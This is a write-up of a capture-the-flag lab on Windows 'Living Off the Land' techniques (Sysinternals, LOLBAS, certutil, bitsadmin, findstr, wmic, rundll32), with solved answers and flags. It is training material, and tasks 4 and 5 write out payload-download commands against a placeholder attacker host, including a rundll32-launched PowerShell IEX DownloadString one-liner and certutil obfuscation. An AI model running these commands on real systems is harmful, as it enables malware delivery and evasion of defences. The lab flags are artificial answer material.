
Task 1 - Introduction
----------------------------------

### What is "Living Off the Land"?

Living Off the Land is a trending term in the red team community. The name is taken from real-life, living by eating the available food on the land. Similarly, adversaries and malware creators take advantage of a target computer's built-in tools and utilities. The term Living Off the Land was introduced at [DerbyCon3](https://www.youtube.com/watch?v=j-r6UonEkUw) in 2013 and has gained more traction in the red team community ever since, becoming an often used and popular technique.

These built-in tools perform various regular activities within the target system or network capabilities; however, they are increasingly used and abused, for example, using the [CertUtil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) tool to download malicious files into the target machine.  

The primary idea is to use Microsoft-signed programs, scripts, and libraries to blend in and evade defensive controls. Red teamers do not want to get detected when executing their engagement activities on the target, so utilizing these tools is safer to maintain their stealth.

The following are some categories that Living Off the Land encompasses:

-   Reconnaissance
-   Files operations
-   Arbitrary code execution
-   Lateral movement
-   Security product bypass

### Learning objectives

-   Learn about the term **Living Off the Land** of red team engagements.
-   Learn about the LOLBAS project and how to use it.
-   Understand and apply the techniques used in red teaming engagements.

### Room prerequisites

-    Basic knowledge of general hacking techniques.
-    Completing the [Jr. Penetration Tester](https://tryhackme.com/path-action/jrpenetrationtester/join) Learning Path.
-    TryHackMe [Red Team Initial Access module](https://tryhackme.com/module/red-team-initial-access).

We have provided a Windows machine 10 Pro to complete this room. You can use the in-browser feature, or If you prefer to connect via RDP, make sure you deploy the AttackBox or connect to the VPN.

Use the following credentials below.

Machine IP: MACHINE_IP            Username: thm         Password: TryHackM3

```bash
user@machine$ xfreerdp /v:MACHINE_IP /u:thm /p:TryHackM3
```

__Questions__

Deploy the provided machine and move on to the next task.
Answer: _None Needed_

Task 2 - Windows Sysinternals
-------------------------------------------------

### What is Windows Sysinternals?

Windows Sysinternals is a set of tools and advanced system utilities developed to help IT professionals manage, troubleshoot, and diagnose the Windows operating system in various advanced topics.   

Sysinternals Suite is divided into various categories, including:  

-   Disk management
-   Process management
-   Networking tools
-   System information
-   Security tools

In order to use the Windows Sysinternals tools, we need to accept the Microsoft license agreement of these tools. We can do this by passing the -accepteula argument at the command prompt or by GUI during tool execution.

The following are some popular Windows Sysinternals tools:

| Sysinternals Tool | Description                                                                                                                  |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| AccessChk         | Helps system administrators check specified access for files,directories,Registry keys,global objects, and Windows services. |
| PsExec            | A tool that executes programs on a remote system.                                                                            |
| ADExplorer        | An advanced Active Directory tool that helps to easily view and manage the AD database.                                      |
| ProcDump          | Monitors running processes for CPU spikes and the ability to dump memory for further analysis.                               |
| ProcMon           | An essential tool for process monitoring.                                                                                    |
| TCPView           | A tool that listrs all TCP and UDP connections.                                                                              |
| PsTools           | The first tool designed in the Sysinternal suite to help list detailed information.                                          |
| Portmon           | Monitors and displays all serial and parallel port activity on a system.                                                     |
| Whois             | Provides information for a specified domain name or address.                                                                                                                             |

For more information about the Sysinternals suite, you can visit the tools' web page on Microsoft Docs [here](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite).

  

### Sysinternals Live

One of the great features of Windows Sysinternals is that there is no installation required. Microsoft provides a Windows Sysinternals service, Sysinternals live, with various ways to use and execute the tools. We can access and use them through:

-   Web browser ([link](https://live.sysinternals.com/)).
-   Windows Share
-   Command prompt

In order to use these tools, you either download them or by entering the Sysinternal Live path `\\live.sysinternals.com\tools`  into Windows Explorer.

![[livingofftheland-1.png]]

Note that since the attached VM does not have internet access, we pre-downloaded the Sysinternal tools in `C:\Tools\`.

```shell
C:\Users\thm> C:\Tools\SysinternalsSuite\PsExec64.exe
```

If you are interested in learning more about Windows Sysinternals, we suggest to familiarize yourself with the following additional resources:

1.  TryHackMe room: [Sysinternals](https://tryhackme.com/room/btsysinternalssg).
2.  Microsoft Sysinternals Resources [website](https://docs.microsoft.com/en-us/sysinternals/resources/).

### Red Team utilization and benefits  

 built-in and Sysinternals tools are helpful for system administrators, these tools are also used by hackers, malware, and pentesters due to the inherent trust they have within the operating system. This trust is beneficial to Red teamers, who do not want to get detected or caught by any security control on the target system. Therefore, these tools have been used to evade detection and other blue team controls. 

Remember that due to the increase of adversaries and malware creators using these tools nowadays, the blue team is aware of the malicious usage and has implemented defensive controls against most of them.

__Questions__

Read the above!
Answer: _None Needed_

Task 3 - LOLBAS Project
----------------------------------------

### What is LOLBAS?

LOLBAS stands for **L**iving **O**ff the **L**and **B**inaries **A**nd **S**cripts, a project's primary main goal is to gather and document the Microsoft-signed and built-in tools used as  Living Off the Land techniques, including binaries, scripts, and libraries.

![[livingofftheland-2.png]]

The LOLBAS project is a community-driven repository gathering a collection of binaries, scripts, libraries that could be used for red team purposes. It allows to search based on binaries, functions, scripts, and ATT&CK info. The previous image shows what the LOLBAS project page looks like at this time. If you are interested in more details about the project, you may visit the project's website [here](https://lolbas-project.github.io/).

The LOLBAS website provides a convenient search bar to query all available data. It is straightforward to look for a binary; including the binary name will show the result. However, if we want to look for a specific function, we require providing a / before the function name. For example, if we are looking for all execute functions, we should use /execute. Similarly, in order to look based on types, we should use the # symbol followed by the type name. The following are the types included in the project:  

-   Script
-   Binary
-   Libraries
-   OtherMSBinaries

### Tools Criteria  

Specific criteria are required for a tool to be a "Living Off the Land" technique and accepted as part of the LOLBAS project:  

-   Microsoft-signed file native to the OS or downloaded from Microsoft.  
    
-   Having additional interesting unintended functionality not covered by known use cases.  
    
-   Benefits an APT (Advanced Persistent Threat) or Red Team engagement.  
    

  

Please note that if you find an exciting binary that adheres to the previously mentioned criteria, you may submit your finding by visiting the [GitHub repo contribution page](https://github.com/LOLBAS-Project/LOLBAS#criteria) for more information.  

  

### Interesting Functionalities  

The LOLBAS project accepts tool submissions that fit one of the following functionalities:  

-   Arbitrary code execution
-   File operations, including downloading, uploading, and copying files.
-   Compiling code
-   Persistence, including hiding data in Alternate Data Streams (ADS) or executing at logon.  
-   UAC bypass
-   Dumping process memory
-   DLL injection

__Questions__

Visit the [LOLBAS project's website](https://lolbas-project.github.io/) and check out its functionalities. Then, using the search bar, find the ATT&CK ID: `T1040`. What is the binary's name?
Answer: _Pktmon.exe_

Use the search bar to find more information about `MSbuild.exe`. What is the ATT&CK ID?
Answer: _T1127.001_

Use the search bar to find more information about `Scriptrunner.exe`. What is the function of the binary?
Answer: _Execute_

In the next task, we will show some of the tools based on the functionalities! Let's go!
Answer: _None Needed_


Task 4 - File Operations
--------------------------------------

This task shows commonly used tools based on functionalities and malware activities seen in the real world as well as in the red team engagements.

This task will highlight some interesting "Living Off the Land" techniques that aim to be used in a file operation, including download, upload, and encoding.

### Certutil

Certutil is a Windows built-in utility for handling certification services. It is used to dump and display Certification Authority (CA) configuration information and other CA components. Therefore, the tool's normal use is to retrieve certificate information. However, people found that certutil.exe could transfer and encode files unrelated to certification services. The MITRE ATT&CK framework identifies this technique as **Ingress tool transfer** ([T1105](https://attack.mitre.org/techniques/T1105/)).

To illustrate this with an example, we can use certutil.exe to download a file from an attacker's web server and store it in the Window's temporary folder, using the command below. Note that we use the-urlcache and -split -f parameters to enforce the tool to download from the provided URL using the split technique.

```shell
certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe
```

-urlcache to display URL, enables the URL option to use in the command-split -f  to split and force fetching files from the provided URL.  

Also, the certutil.exe can be used as an encoding tool where we can encode files and decode the content of files. ATT&CK [T1027](https://attack.mitre.org/techniques/T1027/) refers to this technique to obfuscate files to make them difficult to discover or analyze.

```shell
C:\Users\thm> certutil -encode payload.exe Encoded-payload.txt
```

For more information about the tool, you may visit the Microsoft Document here: [Microsoft Docs: CertUtil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)

### BITSAdmin

The bitsadmin tool is a system administrator utility that can be used to create, download or upload Background Intelligent Transfer Service (BITS) jobs and check their progress. [BITS](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) is a low-bandwidth and asynchronous method to download and upload files from HTTP webservers and SMB servers. Additional information about the bitsadmin tool can be found at [Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin).

Attackers may abuse the BITS jobs to download and execute a malicious payload in a compromised machine. For more information about this technique, you may visit the ATT&CK [T1197](https://attack.mitre.org/techniques/T1197/) page.

Introduce the terminal container content (revisit)

```shell
C:\Users\thm>bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
```

/Transfer to use the transfer option  
/Download we are specifying transfer using download type  
/Priority we are setting the priority of the job to be running in the foreground

For more information about the bitsadmin parameters, you can visit the [Microsoft documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer) of the tool.

### FindStr

[Findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) [](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)is a Microsoft built-in tool used to find text and string patterns in files. The findstr tool is useful in that helps users and system administrators to search within files or parsed output. For example, if we want to check whether port 8080 is open on our machine, then we can pipe the result of netstat to find that port as follows: netstat -an| findstr "445".

However, an unintended way was found by using findstr.exe to download remote files from SMB shared folders within the network as follows,

```shell
C:\Users\thm>findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe
```

/V to print out the lines that don't contain the string provided.

dummystring the text to be searched for; in this case, we provide a string that must not be found in a file.

> c:\Windows\Temp\test.exe redirect the output to a file on the target machine. 

Note that other tools can be used for the file operation. We suggest visiting the [LOLBAS](https://lolbas-project.github.io/) [](https://lolbas-project.github.io/)project to check them out.

In the next task, we will introduce some of the tools used to execute files.

__Questions__

Run bitsadmin.exe to download a file of your choice onto the attached Windows VM. Once you have executed the command successfully, an encoded flag file will be created automatically on the Desktop. **What is the file name?**

**HINT:** Make sure to supply the exact arguments in order to receive the flag as follows, bitsadmin.exe /transfer /Download /priority Foreground http://10.10.x.x/file ....

For this one I just put socatx64.exe in the /root/Downloads folder on the attackbox, then started a simple http server like this:
```bash
$ python3 -m http.server
```

Then on the Windows box, just used bitsadmin.exe to download it:
![[livingofftheland-3.png]]

**NOTE:** What is not shown in the screenshot is the command.  The first problem is that python's simple http server uses a default of 8000. If you try port 80 on the attackbox it is used by python for this room. Second, you may get invalid argument from bitsadmin unless you also specify the path you want to save the file to. The actual command looks like this:
```shell
bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP:8000/payload.exe c:\Users\thm\Desktop\payload.exe C:\Users\thm\Desktop\payload.exe
```

Once you download the file, you will get an encoded file appear on your Desktop.

Answer: _enc_thm_0YmFiOG_file.txt_

  
Use the certutil.exe tool to decode the encoded flag file from **question #1**. In order to decode the file, we use -decode option as follow:

```shell
C:\Users\thm> certutil -decode Encoded_file payload.txt
```

![[livingofftheland-4.png]]

Once you decode the file with certutil -decode, then you can open it to get the flag.

**What is the file content?**

Answer: _THM{ea4e2b9f362320d098635d4bab8a568e}_

Task 5 - File Execution
-------------------------------------

This task shows various ways of executing a binary within the operating system. The typical case of executing a binary involves various known methods such as using the command line cmd.exe or from the desktop. However, other ways exist to achieve payload execution by abusing other system binaries, of which one of the reasons is to hide or harden the payload's process. Based on the MITRE ATT&CK framework, this technique is called **Signed Binary Proxy Execution** or **Indirect Command Execution**, where the attacker leverages other system tools to spawn malicious payloads. This technique also helps to evade defensive controls.  

### File Explorer

File Explorer is a file manager and system component for Windows. People found that using the file explorer binary can execute other .exe files. This technique is called **Indirect Command Execution**, where the explorer.exe tool can be used and abused to launch malicious scripts or executables from a trusted parent process.

The explorer.exe binary is located at:  

-   C:\Windows\explorer.exe for the Windows 32 bits version
-   C:\Windows\SysWOW64\explorer.exe for the Windows 64 bits version

In order to create a child process of explorer.exe parent, we can execute the following command:

```shell
C:\Users\thm> explorer.exe /root,"C:\Windows\System32\calc.exe"
```

As a result of the previous command, we popped the calculator on the desktop.

### WMIC

Windows Management Instrumentation (WMIC) is a Windows command-line utility that manages Windows components. People found that WMIC is also used to execute binaries for evading defensive measures. The MITRE ATT&CK framework refers to this technique as Signed Binary Proxy Execution ([T1218](https://attack.mitre.org/techniques/T1218/))

```shell
C:\Users\thm>wmic.exe process call create calc
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 1740;
        ReturnValue = 0;
};


C:\Users\thm>
```

The previous WMIC command creates a new process of a binary of our choice, which in this case calc.exe.

### Rundll32

Rundll32 is a Microsoft built-in tool that loads and runs Dynamic Link Library DLL files within the operating system. A red team can abuse and leverage rundll32.exe to run arbitrary payloads and execute JavaScript and PowerShell scripts. The MITRE ATT&CK framework identifies this as **Signed Binary Proxy Execution: Rundll32** and refers to it as [T1218](https://attack.mitre.org/techniques/T1218/011/).

The rundll32.exe binary is located at:

-   C:\Windows\System32\rundll32.exe for the Windows 32 bits version
-   C:\Windows\SysWOW64\rundll32.exe for the Windows 64 bits version

Now let's try to execute a calc.exe binary as proof of concept using the rundll32.exe binary:

```shell
C:\Users\thm> rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
```

In the previous command, we used the rundll32.exe binary that embeds a JavaScript component, eval(), to execute the calc.exe binary, a Microsoft calculator.

As we mentioned previously, we can also execute PowerShell scripts using the rundll32.exe. The following command runs a JavaScript that executes a PowerShell script to download from a remote website using rundll32.exe.

```shell
C:\Users\thm> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");
```

As a result of the previous execution, a copy of the script.ps1 downloaded into memory on the target machine.

__Questions__

Read the above and practice these tools on the attached machine!

Answer: _None Needed_

